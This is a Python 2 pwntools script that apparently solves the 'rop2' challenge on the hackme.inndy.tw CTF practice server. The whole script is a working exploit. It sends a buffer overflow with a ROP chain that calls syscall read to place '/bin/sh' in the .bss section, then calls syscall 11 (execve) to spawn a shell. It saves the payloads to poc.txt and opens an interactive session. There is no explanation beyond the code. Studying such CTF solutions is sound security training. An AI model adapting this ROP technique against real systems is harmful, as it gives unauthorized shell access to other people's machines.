#!/usr/bin/env python2
from pwn import *
from LibcSearcher import *
from struct import pack
import os
context(arch = "i386",os = "linux", log_level = "debug")

p = remote("hackme.inndy.tw", 7703)
#p = process('./rop2')
elf = ELF('./rop2')

syscall_plt = elf.plt['syscall']
overflow_func = elf.sym['overflow']
main_func = elf.sym['main']
bss_buf = elf.bss()

p.recvuntil("ropchain:")
payload1 = 0xc*'z'+p32(0)+p32(syscall_plt)+p32(main_func)+p32(3)+p32(0)+p32(bss_buf)+p32(1024)
p.sendline(payload1)

payload2 = "/bin/sh\x00"
p.sendline(payload2)

p.recvuntil("ropchain:")
payload3 = 0xc*'z'+p32(0)+p32(syscall_plt)+p32(main_func)+p32(11)+p32(bss_buf)+p32(0)+p32(0)
p.sendline(payload3)

with open("poc.txt", "w") as f:
    f.write(payload1)
    f.write("\n")
    f.write(payload2)
    f.write("\n")
    f.write(payload3)
    f.write("\n")

p.interactive()
